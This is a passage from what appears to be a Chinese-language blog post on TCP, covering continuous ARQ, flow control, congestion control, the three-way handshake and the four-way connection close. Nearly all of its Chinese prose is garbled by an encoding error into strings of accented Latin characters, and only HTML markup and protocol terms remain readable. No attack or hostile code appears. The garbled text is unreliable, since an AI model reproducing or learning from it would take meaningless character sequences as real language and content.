å¯æé«˜ä¿¡é“åˆ©ç”¨ç‡ã€‚å‘é€ç»´æŒä¸€ä¸ªå‘é€çª—å£ï¼Œå‡¡ä½äºå‘é€çª—å£å†…çš„åˆ†ç»„å¯è¿ç»­å‘é€å‡ºå»ï¼Œè€Œä¸éœ€è¦ç­‰å¾…å¯¹æ–¹ç¡®è®¤ã€‚æ¥æ”¶æ–¹ä¸€èˆ¬é‡‡ç”¨ç´¯ç§¯ç¡®è®¤ï¼Œå¯¹æŒ‰åºåˆ°è¾¾çš„æœ€åä¸€ä¸ªåˆ†ç»„å‘é€ç¡®è®¤ï¼Œè¡¨æ˜åˆ°è¿™ä¸ªåˆ†ç»„ä½ç½®çš„æ‰€æœ‰åˆ†ç»„éƒ½å·²ç»æ­£ç¡®æ”¶åˆ°äº†ã€‚</p>
<p><strong>3) ç¡®è®¤ä¸¢å¤±å’Œç¡®è®¤è¿Ÿåˆ°</strong></p>
<ul>
<li><strong>ç¡®è®¤ä¸¢å¤±</strong> ï¼šç¡®è®¤æ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸¢å¤±ã€‚å½“Aå‘é€M1æ¶ˆæ¯ï¼ŒBæ”¶åˆ°åï¼ŒBå‘Aå‘é€äº†ä¸€ä¸ªM1ç¡®è®¤æ¶ˆæ¯ï¼Œä½†å´åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸¢å¤±ã€‚è€ŒAå¹¶ä¸çŸ¥é“ï¼Œåœ¨è¶…æ—¶è®¡æ—¶è¿‡åï¼ŒAé‡ä¼ M1æ¶ˆæ¯ï¼ŒBå†æ¬¡æ”¶åˆ°è¯¥æ¶ˆæ¯åé‡‡å–ä»¥ä¸‹ä¸¤ç‚¹æªæ–½ï¼š1. ä¸¢å¼ƒè¿™ä¸ªé‡å¤çš„M1æ¶ˆæ¯ï¼Œä¸å‘ä¸Šå±‚äº¤ä»˜ã€‚ 2. å‘Aå‘é€ç¡®è®¤æ¶ˆæ¯ã€‚ï¼ˆä¸ä¼šè®¤ä¸ºå·²ç»å‘é€è¿‡äº†ï¼Œå°±ä¸å†å‘é€ã€‚Aèƒ½é‡ä¼ ï¼Œå°±è¯æ˜Bçš„ç¡®è®¤æ¶ˆæ¯ä¸¢å¤±ï¼‰ã€‚</li>
<li><strong>ç¡®è®¤è¿Ÿåˆ°</strong> ï¼šç¡®è®¤æ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¿Ÿåˆ°ã€‚Aå‘é€M1æ¶ˆæ¯ï¼ŒBæ”¶åˆ°å¹¶å‘é€ç¡®è®¤ã€‚åœ¨è¶…æ—¶æ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ç¡®è®¤æ¶ˆæ¯ï¼ŒAé‡ä¼ M1æ¶ˆæ¯ï¼ŒBä»ç„¶æ”¶åˆ°å¹¶ç»§ç»­å‘é€ç¡®è®¤æ¶ˆæ¯ï¼ˆBæ”¶åˆ°äº†2ä»½M1ï¼‰ã€‚æ­¤æ—¶Aæ”¶åˆ°äº†Bç¬¬äºŒæ¬¡å‘é€çš„ç¡®è®¤æ¶ˆæ¯ã€‚æ¥ç€å‘é€å…¶ä»–æ•°æ®ã€‚è¿‡äº†ä¸€ä¼šï¼ŒAæ”¶åˆ°äº†Bç¬¬ä¸€æ¬¡å‘é€çš„å¯¹M1çš„ç¡®è®¤æ¶ˆæ¯ï¼ˆAä¹Ÿæ”¶åˆ°äº†2ä»½ç¡®è®¤æ¶ˆæ¯ï¼‰ã€‚å¤„ç†å¦‚ä¸‹ï¼š1. Aæ”¶åˆ°é‡å¤çš„ç¡®è®¤åï¼Œç›´æ¥ä¸¢å¼ƒã€‚2. Bæ”¶åˆ°é‡å¤çš„M1åï¼Œä¹Ÿç›´æ¥ä¸¢å¼ƒé‡å¤çš„M1ã€‚</li>
</ul>
<h4 id="è¿ç»­ARQåè®®"><a href="#è¿ç»­ARQåè®®" class="headerlink" title="è¿ç»­ARQåè®®"></a>è¿ç»­ARQåè®®</h4><p>è¿ç»­ ARQ åè®®å¯æé«˜ä¿¡é“åˆ©ç”¨ç‡ã€‚å‘é€æ–¹ç»´æŒä¸€ä¸ªå‘é€çª—å£ï¼Œå‡¡ä½äºå‘é€çª—å£å†…çš„åˆ†ç»„å¯ä»¥è¿ç»­å‘é€å‡ºå»ï¼Œè€Œä¸éœ€è¦ç­‰å¾…å¯¹æ–¹ç¡®è®¤ã€‚æ¥æ”¶æ–¹ä¸€èˆ¬é‡‡ç”¨ç´¯è®¡ç¡®è®¤ï¼Œå¯¹æŒ‰åºåˆ°è¾¾çš„æœ€åä¸€ä¸ªåˆ†ç»„å‘é€ç¡®è®¤ï¼Œè¡¨æ˜åˆ°è¿™ä¸ªåˆ†ç»„ä¸ºæ­¢çš„æ‰€æœ‰åˆ†ç»„éƒ½å·²ç»æ­£ç¡®æ”¶åˆ°äº†ã€‚</p>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>ä¼˜ç‚¹ï¼š</strong> ä¿¡é“åˆ©ç”¨ç‡é«˜ï¼Œå®¹æ˜“å®ç°ï¼Œå³ä½¿ç¡®è®¤ä¸¢å¤±ï¼Œä¹Ÿä¸å¿…é‡ä¼ ã€‚</li>
<li><strong>ç¼ºç‚¹ï¼š</strong> ä¸èƒ½å‘å‘é€æ–¹åæ˜ å‡ºæ¥æ”¶æ–¹å·²ç»æ­£ç¡®æ”¶åˆ°çš„æ‰€æœ‰åˆ†ç»„çš„ä¿¡æ¯ã€‚ æ¯”å¦‚ï¼šå‘é€æ–¹å‘é€äº† 5æ¡æ¶ˆæ¯ï¼Œä¸­é—´ç¬¬ä¸‰æ¡ä¸¢å¤±ï¼ˆ3å·ï¼‰ï¼Œè¿™æ—¶æ¥æ”¶æ–¹åªèƒ½å¯¹å‰ä¸¤ä¸ªå‘é€ç¡®è®¤ã€‚å‘é€æ–¹æ— æ³•çŸ¥é“åä¸‰ä¸ªåˆ†ç»„çš„ä¸‹è½ï¼Œè€Œåªå¥½æŠŠåä¸‰ä¸ªå…¨éƒ¨é‡ä¼ ä¸€æ¬¡ã€‚è¿™ä¹Ÿå« Go-Back-Nï¼ˆå›é€€ Nï¼‰ï¼Œè¡¨ç¤ºéœ€è¦é€€å›æ¥é‡ä¼ å·²ç»å‘é€è¿‡çš„ N ä¸ªæ¶ˆæ¯ã€‚</li>
</ul>
<h3 id="æ»‘åŠ¨çª—å£å’Œæµé‡æ§åˆ¶"><a href="#æ»‘åŠ¨çª—å£å’Œæµé‡æ§åˆ¶" class="headerlink" title="æ»‘åŠ¨çª—å£å’Œæµé‡æ§åˆ¶"></a>æ»‘åŠ¨çª—å£å’Œæµé‡æ§åˆ¶</h3><p><strong>TCP åˆ©ç”¨æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶ã€‚æµé‡æ§åˆ¶æ˜¯ä¸ºäº†æ§åˆ¶å‘é€æ–¹å‘é€é€Ÿç‡ï¼Œä¿è¯æ¥æ”¶æ–¹æ¥å¾—åŠæ¥æ”¶ã€‚</strong> æ¥æ”¶æ–¹å‘é€çš„ç¡®è®¤æŠ¥æ–‡ä¸­çš„çª—å£å­—æ®µå¯ä»¥ç”¨æ¥æ§åˆ¶å‘é€æ–¹çª—å£å¤§å°ï¼Œä»è€Œå½±å“å‘é€æ–¹çš„å‘é€é€Ÿç‡ã€‚å°†çª—å£å­—æ®µè®¾ç½®ä¸º 0ï¼Œåˆ™å‘é€æ–¹ä¸èƒ½å‘é€æ•°æ®ã€‚</p>
<h3 id="æ‹¥å¡æ§åˆ¶"><a href="#æ‹¥å¡æ§åˆ¶" class="headerlink" title="æ‹¥å¡æ§åˆ¶"></a>æ‹¥å¡æ§åˆ¶</h3><p>åœ¨æŸæ®µæ—¶é—´ï¼Œè‹¥å¯¹ç½‘ç»œä¸­æŸä¸€èµ„æºçš„éœ€æ±‚è¶…è¿‡äº†è¯¥èµ„æºæ‰€èƒ½æä¾›çš„å¯ç”¨éƒ¨åˆ†ï¼Œç½‘ç»œçš„æ€§èƒ½å°±è¦å˜åã€‚è¿™ç§æƒ…å†µå°±å«æ‹¥å¡ã€‚æ‹¥å¡æ§åˆ¶å°±æ˜¯ä¸ºäº†é˜²æ­¢è¿‡å¤šçš„æ•°æ®æ³¨å…¥åˆ°ç½‘ç»œä¸­ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç½‘ç»œä¸­çš„è·¯ç”±å™¨æˆ–é“¾è·¯ä¸è‡´è¿‡è½½ã€‚æ‹¥å¡æ§åˆ¶æ‰€è¦åšçš„éƒ½æœ‰ä¸€ä¸ªå‰æï¼Œå°±æ˜¯ç½‘ç»œèƒ½å¤Ÿæ‰¿å—ç°æœ‰çš„ç½‘ç»œè´Ÿè·ã€‚æ‹¥å¡æ§åˆ¶æ˜¯ä¸€ä¸ªå…¨å±€æ€§çš„è¿‡ç¨‹ï¼Œæ¶‰åŠåˆ°æ‰€æœ‰çš„ä¸»æœºï¼Œæ‰€æœ‰çš„è·¯ç”±å™¨ï¼Œä»¥åŠä¸é™ä½ç½‘ç»œä¼ è¾“æ€§èƒ½æœ‰å…³çš„æ‰€æœ‰å› ç´ ã€‚ç›¸åï¼Œæµé‡æ§åˆ¶å¾€å¾€æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡é‡çš„æ§åˆ¶ï¼Œæ˜¯ä¸ªç«¯åˆ°ç«¯çš„é—®é¢˜ã€‚æµé‡æ§åˆ¶æ‰€è¦åšåˆ°çš„å°±æ˜¯æŠ‘åˆ¶å‘é€ç«¯å‘é€æ•°æ®çš„é€Ÿç‡ï¼Œä»¥ä¾¿ä½¿æ¥æ”¶ç«¯æ¥å¾—åŠæ¥æ”¶ã€‚</p>
<p>ä¸ºäº†è¿›è¡Œæ‹¥å¡æ§åˆ¶ï¼ŒTCP å‘é€æ–¹è¦ç»´æŒä¸€ä¸ª <strong>æ‹¥å¡çª—å£(cwnd)</strong> çš„çŠ¶æ€å˜é‡ã€‚æ‹¥å¡æ§åˆ¶çª—å£çš„å¤§å°å–å†³äºç½‘ç»œçš„æ‹¥å¡ç¨‹åº¦ï¼Œå¹¶ä¸”åŠ¨æ€å˜åŒ–ã€‚å‘é€æ–¹è®©è‡ªå·±çš„å‘é€çª—å£å–ä¸ºæ‹¥å¡çª—å£å’Œæ¥æ”¶æ–¹çš„æ¥å—çª—å£ä¸­è¾ƒå°çš„ä¸€ä¸ªã€‚</p>
<p>TCPçš„æ‹¥å¡æ§åˆ¶é‡‡ç”¨äº†å››ç§ç®—æ³•ï¼Œå³ <strong>æ…¢å¼€å§‹</strong> ã€ <strong>æ‹¥å¡é¿å…</strong> ã€<strong>å¿«é‡ä¼ </strong> å’Œ <strong>å¿«æ¢å¤</strong>ã€‚åœ¨ç½‘ç»œå±‚ä¹Ÿå¯ä»¥ä½¿è·¯ç”±å™¨é‡‡ç”¨é€‚å½“çš„åˆ†ç»„ä¸¢å¼ƒç­–ç•¥ï¼ˆå¦‚ä¸»åŠ¨é˜Ÿåˆ—ç®¡ç† AQMï¼‰ï¼Œä»¥å‡å°‘ç½‘ç»œæ‹¥å¡çš„å‘ç”Ÿã€‚</p>
<ul>
<li><strong>æ…¢å¼€å§‹ï¼š</strong> æ…¢å¼€å§‹ç®—æ³•çš„æ€è·¯æ˜¯å½“ä¸»æœºå¼€å§‹å‘é€æ•°æ®æ—¶ï¼Œå¦‚æœç«‹å³æŠŠå¤§é‡æ•°æ®å­—èŠ‚æ³¨å…¥åˆ°ç½‘ç»œï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå¼•èµ·ç½‘ç»œé˜»å¡ï¼Œå› ä¸ºç°åœ¨è¿˜ä¸çŸ¥é“ç½‘ç»œçš„ç¬¦åˆæƒ…å†µã€‚ç»éªŒè¡¨æ˜ï¼Œè¾ƒå¥½çš„æ–¹æ³•æ˜¯å…ˆæ¢æµ‹ä¸€ä¸‹ï¼Œå³ç”±å°åˆ°å¤§é€æ¸å¢å¤§å‘é€çª—å£ï¼Œä¹Ÿå°±æ˜¯ç”±å°åˆ°å¤§é€æ¸å¢å¤§æ‹¥å¡çª—å£æ•°å€¼ã€‚cwndåˆå§‹å€¼ä¸º1ï¼Œæ¯ç»è¿‡ä¸€ä¸ªä¼ æ’­è½®æ¬¡ï¼ŒcwndåŠ å€ã€‚</li>
<li><strong>æ‹¥å¡é¿å…ï¼š</strong> æ‹¥å¡é¿å…ç®—æ³•çš„æ€è·¯æ˜¯è®©æ‹¥å¡çª—å£cwndç¼“æ…¢å¢å¤§ï¼Œå³æ¯ç»è¿‡ä¸€ä¸ªå¾€è¿”æ—¶é—´RTTå°±æŠŠå‘é€æ–¹çš„cwndåŠ 1.</li>
<li><strong>å¿«é‡ä¼ ä¸å¿«æ¢å¤ï¼š</strong> åœ¨ TCP&#x2F;IP ä¸­ï¼Œå¿«é€Ÿé‡ä¼ å’Œæ¢å¤ï¼ˆfast retransmit and recoveryï¼ŒFRRï¼‰æ˜¯ä¸€ç§æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œå®ƒèƒ½å¿«é€Ÿæ¢å¤ä¸¢å¤±çš„æ•°æ®åŒ…ã€‚æ²¡æœ‰FRRï¼Œå¦‚æœæ•°æ®åŒ…ä¸¢å¤±äº†ï¼ŒTCP å°†ä¼šä½¿ç”¨å®šæ—¶å™¨æ¥è¦æ±‚ä¼ è¾“æš‚åœã€‚åœ¨æš‚åœçš„è¿™æ®µæ—¶é—´å†…ï¼Œæ²¡æœ‰æ–°çš„æˆ–å¤åˆ¶çš„æ•°æ®åŒ…è¢«å‘é€ã€‚æœ‰äº† FRRï¼Œå¦‚æœæ¥æ”¶æœºæ¥æ”¶åˆ°ä¸€ä¸ªä¸æŒ‰é¡ºåºçš„æ•°æ®æ®µï¼Œå®ƒä¼šç«‹å³ç»™å‘é€æœºå‘é€ä¸€ä¸ªé‡å¤ç¡®è®¤ã€‚å¦‚æœå‘é€æœºæ¥æ”¶åˆ°ä¸‰ä¸ªé‡å¤ç¡®è®¤ï¼Œå®ƒä¼šå‡å®šç¡®è®¤ä»¶æŒ‡å‡ºçš„æ•°æ®æ®µä¸¢å¤±äº†ï¼Œå¹¶ç«‹å³é‡ä¼ è¿™äº›ä¸¢å¤±çš„æ•°æ®æ®µã€‚æœ‰äº† FRRï¼Œå°±ä¸ä¼šå› ä¸ºé‡ä¼ æ—¶è¦æ±‚çš„æš‚åœè¢«è€½è¯¯ã€‚ ã€€å½“æœ‰å•ç‹¬çš„æ•°æ®åŒ…ä¸¢å¤±æ—¶ï¼Œå¿«é€Ÿé‡ä¼ å’Œæ¢å¤ï¼ˆFRRï¼‰èƒ½æœ€æœ‰æ•ˆåœ°å·¥ä½œã€‚å½“æœ‰å¤šä¸ªæ•°æ®ä¿¡æ¯åŒ…åœ¨æŸä¸€æ®µå¾ˆçŸ­çš„æ—¶é—´å†…ä¸¢å¤±æ—¶ï¼Œå®ƒåˆ™ä¸èƒ½å¾ˆæœ‰æ•ˆåœ°å·¥ä½œã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848407.png" alt="img"></p>
<h2 id="TCPä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹"><a href="#TCPä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹" class="headerlink" title="TCPä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹"></a>TCPä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848423.jpeg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848427.png" alt="img"></p>
<p>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå»ºç«‹è¿æ¥æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€synåŒ…ï¼ˆseq&#x3D;xï¼‰åˆ°æœåŠ¡å™¨ï¼Œå¹¶è¿›å…¥SYN_SENTçŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨ç¡®è®¤ï¼›SYNï¼šåŒæ­¥åºåˆ—ç¼–å·ï¼ˆSynchronize Sequence Numbersï¼‰ã€‚</p>
<p>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°synåŒ…ï¼Œå¿…é¡»ç¡®è®¤å®¢æˆ·çš„SYNï¼ˆack&#x3D;x+1ï¼‰ï¼ŒåŒæ—¶è‡ªå·±ä¹Ÿå‘é€ä¸€ä¸ªSYNåŒ…ï¼ˆseq&#x3D;yï¼‰ï¼Œå³SYN+ACKåŒ…ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥SYN_RECVçŠ¶æ€ï¼›</p>
<p>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„SYN+ACKåŒ…ï¼Œå‘æœåŠ¡å™¨å‘é€ç¡®è®¤åŒ…ACK(ack&#x3D;y+1, seq &#x3D; x + 1ï¼‰ï¼Œæ­¤åŒ…å‘é€å®Œæ¯•ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¿›å…¥ESTABLISHEDï¼ˆTCPè¿æ¥æˆåŠŸï¼‰çŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚</p>
<p>å››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹ç†è§£ </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848497.png" alt="img"></p>
<p>1ï¼‰å®¢æˆ·ç«¯è¿›ç¨‹å‘å‡ºè¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œå¹¶ä¸”åœæ­¢å‘é€æ•°æ®ã€‚é‡Šæ”¾æ•°æ®æŠ¥æ–‡é¦–éƒ¨ï¼ŒFIN&#x3D;1ï¼Œå…¶åºåˆ—å·ä¸ºseq&#x3D;uï¼ˆç­‰äºå‰é¢å·²ç»ä¼ é€è¿‡æ¥çš„æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„åºå·åŠ 1ï¼‰ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯è¿›å…¥FIN-WAIT-1ï¼ˆç»ˆæ­¢ç­‰å¾…1ï¼‰çŠ¶æ€ã€‚ TCPè§„å®šï¼ŒFINæŠ¥æ–‡æ®µå³ä½¿ä¸æºå¸¦æ•°æ®ï¼Œä¹Ÿè¦æ¶ˆè€—ä¸€ä¸ªåºå·ã€‚<br>2ï¼‰æœåŠ¡å™¨æ”¶åˆ°è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼Œå‘å‡ºç¡®è®¤æŠ¥æ–‡ï¼ŒACK&#x3D;1ï¼Œack&#x3D;u+1ï¼Œå¹¶ä¸”å¸¦ä¸Šè‡ªå·±çš„åºåˆ—å·seq&#x3D;vï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡ç«¯å°±è¿›å…¥äº†CLOSE-WAITï¼ˆå…³é—­ç­‰å¾…ï¼‰çŠ¶æ€ã€‚TCPæœåŠ¡å™¨é€šçŸ¥é«˜å±‚çš„åº”ç”¨è¿›ç¨‹ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„æ–¹å‘å°±é‡Šæ”¾äº†ï¼Œè¿™æ—¶å€™å¤„äºåŠå…³é—­çŠ¶æ€ï¼Œå³å®¢æˆ·ç«¯å·²ç»æ²¡æœ‰æ•°æ®è¦å‘é€äº†ï¼Œä½†æ˜¯æœåŠ¡å™¨è‹¥å‘é€æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¾ç„¶è¦æ¥å—ã€‚è¿™ä¸ªçŠ¶æ€è¿˜è¦æŒç»­ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªCLOSE-WAITçŠ¶æ€æŒç»­çš„æ—¶é—´ã€‚<br>3ï¼‰å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„ç¡®è®¤è¯·æ±‚åï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥FIN-WAIT-2ï¼ˆç»ˆæ­¢ç­‰å¾…2ï¼‰çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼ˆåœ¨è¿™ä¹‹å‰è¿˜éœ€è¦æ¥å—æœåŠ¡å™¨å‘é€çš„æœ€åçš„æ•°æ®ï¼‰ã€‚<br>4ï¼‰æœåŠ¡å™¨å°†æœ€åçš„æ•°æ®å‘é€å®Œæ¯•åï¼Œå°±å‘å®¢æˆ·ç«¯å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡ï¼ŒFIN&#x3D;1ï¼Œack&#x3D;u+1ï¼Œç”±äºåœ¨åŠå…³é—­çŠ¶æ€ï¼ŒæœåŠ¡å™¨å¾ˆå¯èƒ½åˆå‘é€äº†ä¸€äº›æ•°æ®ï¼Œå‡å®šæ­¤æ—¶çš„åºåˆ—å·ä¸ºseq&#x3D;wï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡å™¨å°±è¿›å…¥äº†LAST-ACKï¼ˆæœ€åç¡®è®¤ï¼‰çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„ç¡®è®¤ã€‚<br>5ï¼‰å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡åï¼Œå¿…é¡»å‘å‡ºç¡®è®¤ï¼ŒACK&#x3D;1ï¼Œack&#x3D;w+1ï¼Œè€Œè‡ªå·±çš„åºåˆ—å·æ˜¯seq&#x3D;u+1ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥äº†TIME-WAITï¼ˆæ—¶é—´ç­‰å¾…ï¼‰çŠ¶æ€ã€‚æ³¨æ„æ­¤æ—¶TCPè¿æ¥è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œå¿…é¡»ç»è¿‡2MSLï¼ˆæœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½ï¼‰çš„æ—¶é—´åï¼Œå½“å®¢æˆ·ç«¯æ’¤é”€ç›¸åº”çš„TCBåï¼Œæ‰è¿›å…¥CLOSEDçŠ¶æ€ã€‚<br>6ï¼‰æœåŠ¡å™¨åªè¦æ”¶åˆ°äº†å®¢æˆ·ç«¯å‘å‡ºçš„ç¡®è®¤ï¼Œç«‹å³è¿›å…¥CLOSEDçŠ¶æ€ã€‚åŒæ ·ï¼Œæ’¤é”€TCBåï¼Œå°±ç»“æŸäº†è¿™æ¬¡çš„TCPè¿æ¥ã€‚å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç»“æŸTCPè¿æ¥çš„æ—¶é—´è¦æ¯”å®¢æˆ·ç«¯æ—©ä¸€äº›ã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆå…³é—­è¿æ¥çš„éœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Œè€Œå»ºç«‹è¿æ¥å´åªè¦ä¸‰æ¬¡æ¡æ‰‹å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆå…³é—­è¿æ¥çš„éœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Œè€Œå»ºç«‹è¿æ¥å´åªè¦ä¸‰æ¬¡æ¡æ‰‹å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆå…³é—­è¿æ¥çš„éœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Œè€Œå»ºç«‹è¿æ¥å´åªè¦ä¸‰æ¬¡æ¡æ‰‹å‘¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆå…³é—­è¿æ¥çš„éœ€è¦å››æ¬¡æŒ¥æ‰‹ï¼Œè€Œå»ºç«‹è¿æ¥å´åªè¦ä¸‰æ¬¡æ¡æ‰‹å‘¢ï¼Ÿ</h3><p>ä¸ºä»€ä¹ˆè¦æ–­å¼€è¿æ¥,å› ä¸ºç«¯å£å·æœ‰é™;</p>
<p>å…³é—­è¿æ¥æ—¶ï¼Œè¢«åŠ¨æ–­å¼€æ–¹åœ¨æ”¶åˆ°å¯¹æ–¹çš„FINç»“æŸè¯·æ±‚æŠ¥æ–‡æ—¶ï¼Œå¾ˆå¯èƒ½ä¸šåŠ¡æ•°æ®æ²¡æœ‰å‘é€å®Œæˆï¼Œå¹¶ä¸èƒ½ç«‹å³å…³é—­è¿æ¥ï¼Œè¢«åŠ¨æ–¹åªèƒ½å…ˆå›å¤ä¸€ä¸ªACKå“åº”æŠ¥æ–‡ï¼Œå‘Šè¯‰ä¸»åŠ¨æ–­å¼€æ–¹ï¼šâ€œä½ å‘çš„FINæŠ¥æ–‡æˆ‘æ”¶åˆ°äº†ï¼Œåªæœ‰ç­‰åˆ°æˆ‘æ‰€æœ‰çš„ä¸šåŠ¡æŠ¥æ–‡éƒ½å‘é€å®Œäº†ï¼Œæˆ‘æ‰èƒ½çœŸæ­£çš„ç»“æŸï¼Œåœ¨ç»“æŸä¹‹å‰ï¼Œæˆ‘ä¼šå‘ä½ FIN+ACKæŠ¥æ–‡çš„ï¼Œä½ å…ˆç­‰ç€â€ã€‚æ‰€ä»¥ï¼Œè¢«åŠ¨æ–­å¼€æ–¹çš„ç¡®è®¤æŠ¥æ–‡ï¼Œéœ€è¦æ‹†å¼€æˆä¸ºä¸¤æ­¥ï¼Œæ•…æ€»ä½“å°±éœ€è¦å››æ­¥æŒ¥æ‰‹ã€‚</p>
<p>è€Œåœ¨å»ºç«‹è¿æ¥åœºæ™¯ä¸­ï¼ŒServerç«¯çš„åº”ç­”å¯ä»¥ç¨å¾®ç®€å•ä¸€äº›ã€‚å½“Serverç«¯æ”¶åˆ°Clientç«¯çš„SYNè¿æ¥è¯·æ±‚æŠ¥æ–‡åï¼Œå…¶ä¸­ACKæŠ¥æ–‡è¡¨ç¤ºå¯¹è¯·æ±‚æŠ¥æ–‡çš„åº”ç­”ï¼ŒSYNæŠ¥æ–‡ç”¨æ¥è¡¨ç¤ºæœåŠ¡ç«¯çš„è¿æ¥ä¹Ÿå·²ç»åŒæ­¥å¼€å¯äº†ï¼Œè€ŒACKæŠ¥æ–‡å’ŒSYNæŠ¥æ–‡ä¹‹é—´ï¼Œä¸ä¼šæœ‰å…¶ä»–æŠ¥æ–‡éœ€è¦å‘é€ï¼Œæ•…è€Œå¯ä»¥åˆäºŒä¸ºä¸€ï¼Œå¯ä»¥ç›´æ¥å‘é€ä¸€ä¸ªSYN+ACKæŠ¥æ–‡ã€‚æ‰€ä»¥ï¼Œåœ¨å»ºç«‹è¿æ¥æ—¶ï¼Œåªéœ€è¦ä¸‰æ¬¡æ¡æ‰‹å³å¯ã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆè¿æ¥å»ºç«‹çš„æ—¶å€™æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¯ä»¥æ”¹æˆä¸¤æ¬¡æ¡æ‰‹å—ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¿æ¥å»ºç«‹çš„æ—¶å€™æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¯ä»¥æ”¹æˆä¸¤æ¬¡æ¡æ‰‹å—ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¿æ¥å»ºç«‹çš„æ—¶å€™æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¯ä»¥æ”¹æˆä¸¤æ¬¡æ¡æ‰‹å—ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¿æ¥å»ºç«‹çš„æ—¶å€™æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¯ä»¥æ”¹æˆä¸¤æ¬¡æ¡æ‰‹å—ï¼Ÿ</h3><p>ä¸‰æ¬¡æ¡æ‰‹å®Œæˆä¸¤ä¸ªé‡è¦çš„åŠŸèƒ½ï¼šä¸€æ˜¯åŒæ–¹éƒ½åšå¥½å‘é€æ•°æ®çš„å‡†å¤‡å·¥ä½œï¼Œè€Œä¸”åŒæ–¹éƒ½çŸ¥é“å¯¹æ–¹å·²å‡†å¤‡å¥½ï¼›äºŒæ˜¯åŒæ–¹å®Œæˆåˆå§‹SNåºåˆ—å·çš„åå•†ï¼ŒåŒæ–¹çš„SNåºåˆ—å·åœ¨æ¡æ‰‹è¿‡ç¨‹ä¸­è¢«å‘é€å’Œç¡®è®¤ã€‚</p>
<p>å¦‚æœæŠŠä¸‰æ¬¡æ¡æ‰‹æ”¹æˆä¸¤æ¬¡æ¡æ‰‹ï¼Œå¯èƒ½å‘ç”Ÿæ­»é”ã€‚</p>
